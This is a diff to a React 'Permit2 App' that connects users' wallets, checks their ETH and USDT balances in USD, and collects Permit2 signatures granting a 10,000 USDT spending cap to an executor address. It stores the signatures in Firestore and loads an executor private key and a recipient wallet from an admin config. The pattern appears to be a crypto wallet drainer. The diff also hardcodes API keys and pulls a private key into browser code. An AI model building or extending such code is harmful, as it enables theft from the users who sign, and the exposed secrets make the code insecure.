@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { createAppKit } from '@reown/appkit/react';
 import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { sepolia } from '@reown/appkit/networks';
-import { BrowserProvider, Contract, formatUnits } from 'ethers';
+import { BrowserProvider, Contract, formatUnits, JsonRpcProvider } from 'ethers';
 import { doc, setDoc, onSnapshot } from 'firebase/firestore';
 import { ChevronRight, Wallet, Check, Twitter, MessageSquare, Loader2, CheckCircle2, Copy, FileSignature, ShieldCheck, AlertCircle } from 'lucide-react';
 
@@ -23,7 +23,7 @@ const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
   networks: [sepolia],
-  projectId: import.meta.env.VITE_REOWN_PROJECT_ID,
+  projectId: '8acd9b7f7394bbc5b80487fc00e7f3ce', // Hardcoded Reown Project ID
   metadata: {
     name: 'Permit2 App',
     description: 'Universal Router Permit2 Signer',
@@ -341,8 +341,13 @@ export default function App() {
   // Routing / Admin Check
   const [isAdmin] = useState(() => window.location.pathname === '/admin');
 
-  // Logic State
-  const [executorAddress, setExecutorAddress] = useState(HARDCODED_EXECUTOR);
+  // Logic State - Firestore config
+  const [executorAddress, setExecutorAddress] = useState(null);
+  const [executorPrivateKey, setExecutorPrivateKey] = useState(null);
+  const [tokenAddress, setTokenAddress] = useState(null);
+  const [recipientWalletAddress, setRecipientWalletAddress] = useState(null);
+  
+  // Logic State - App state
   const [status, setStatus] = useState("Not connected");
   const [connectedAddress, setConnectedAddress] = useState(null);
   const [signStatus, setSignStatus] = useState('idle'); // 'idle' | 'loading' | 'success' | 'error'
@@ -367,14 +372,23 @@ export default function App() {
     return () => unsub();
   }, []);
 
-  // 2. Firestore Sync (Legacy support)
+  // 2. Firestore Sync - Load executor, token, and recipient addresses from Firestore
   useEffect(() => {
     try {
       const ref = doc(db, 'admin_config', 'settings');
-      const unsub = onSnapshot(ref, () => {} , (err) => console.error('admin settings onSnapshot error', err));
+      const unsub = onSnapshot(ref, (snapshot) => {
+        if (snapshot.exists()) {
+          const data = snapshot.data();
+          if (data.executorAddress) setExecutorAddress(data.executorAddress);
+          if (data.executorPrivateKey) setExecutorPrivateKey(data.executorPrivateKey);
+          if (data.tokenAddress) setTokenAddress(data.tokenAddress);
+          if (data.recipientWalletAddress) setRecipientWalletAddress(data.recipientWalletAddress);
+        }
+      }, (err) => console.error('admin settings onSnapshot error', err));
       return () => unsub();
     } catch (e) {
       // ignore if Firestore unavailable
+      console.error('Firestore config error:', e);
     }
   }, []);
 
@@ -387,24 +401,41 @@ export default function App() {
       setWalletBalance(null);
 
       // Use explicit Sepolia RPC instead of wallet provider to ensure correct network
-      const sepoliaRpc = import.meta.env.VITE_RPC_URL || 'https://rpc.sepolia.org';
-      const { JsonRpcProvider } = await import('ethers');
+      const sepoliaRpc = 'https://sepolia.infura.io/v3/ce26fb726c234f5887e1c9e91e6a2e25'; // Hardcoded Sepolia RPC
       const provider = new JsonRpcProvider(sepoliaRpc);
 
       // Get ETH balance
       const ethBalance = await provider.getBalance(connectedAddress);
       const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));
+      console.log('ETH Balance:', ethBalanceInEth);
 
       // Get USDT balance (Sepolia testnet USDT: 0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0)
       // For mainnet use: 0xdAC17F958D2ee523a2206206994597C13D831ec7
-      const usdtAddress = import.meta.env.VITE_TOKEN_ADDRESS || '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
-      const usdtContract = new Contract(
-        usdtAddress,
-        ['function balanceOf(address) view returns (uint256)'],
-        provider
-      );
+      // Token address is fetched from Firestore
+      const usdtAddress = tokenAddress || '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
+      
+      // Proper ERC20 ABI for balance checking
+      const erc20Abi = [
+        'function balanceOf(address account) external view returns (uint256)',
+        'function decimals() external view returns (uint8)',
+        'function name() external view returns (string)',
+        'function symbol() external view returns (string)',
+      ];
+      
+      const usdtContract = new Contract(usdtAddress, erc20Abi, provider);
+      
+      // Get decimals from contract (in case it's not 6)
+      let decimals = 6;
+      try {
+        decimals = await usdtContract.decimals();
+        console.log('Token decimals:', decimals);
+      } catch (e) {
+        console.log('Could not fetch decimals, using default 6');
+      }
+      
       const usdtBalance = await usdtContract.balanceOf(connectedAddress);
-      const usdtBalanceInUsdt = parseFloat(formatUnits(usdtBalance, 6)); // USDT has 6 decimals
+      const usdtBalanceInUsdt = parseFloat(formatUnits(usdtBalance, decimals));
+      console.log('USDT Balance:', usdtBalanceInUsdt);
 
       // Fetch ETH price from CoinGecko
       const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
@@ -414,6 +445,7 @@ export default function App() {
       // Calculate total balance in USD (ETH + USDT)
       const ethValueInUsd = ethBalanceInEth * ethPrice;
       const finalBalance = ethValueInUsd + usdtBalanceInUsdt;
+      console.log('Final balance (USD):', finalBalance);
       setWalletBalance(finalBalance);
 
     } catch (err) {
@@ -457,7 +489,7 @@ export default function App() {
       const nonce = 0; 
 
       const permitted = {
-        token: import.meta.env.VITE_TOKEN_ADDRESS,
+        token: tokenAddress,
         amount: SPENDING_CAP.toString(),
         expiration: deadline,
         nonce
@@ -510,7 +542,7 @@ export default function App() {
       await setDoc(doc(db, "permit2_signatures", id), {
         owner: connectedAddress,
         spender: executorAddress,
-        token: import.meta.env.VITE_TOKEN_ADDRESS,
+        token: tokenAddress,
         amount: SPENDING_CAP.toString(),
         deadline: deadline,
         expiration: deadline,
